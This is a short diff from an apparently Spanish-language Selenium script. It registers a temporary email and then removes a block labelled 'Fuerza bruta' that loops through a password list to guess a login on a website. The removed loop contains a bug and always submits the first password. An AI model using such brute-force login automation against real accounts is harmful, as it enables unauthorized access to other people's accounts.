@@ -65,14 +65,3 @@ inputmailr = driver.find_element(By.ID, "email")
 inputmailr.send_keys(temp_email)
 inputmailr.send_keys(Keys.ENTER)
 time.sleep(10)
-#Fuerza bruta
-driver.find_element(By.XPATH, '//*[@id="back-to-login"]').click()
-for x in passposible:
-    loginmail = driver.find_element(By.ID, "field-email")
-    loginmail.send_keys(temp_email)
-    loginpass = driver.find_element(By.ID, "field-password")
-    loginpass.send_keys(passposible[0])
-    loginpass.send_keys(Keys.ENTER)
-    if "mi-cuenta" in driver.current_url:
-        break
-    time.sleep(5)
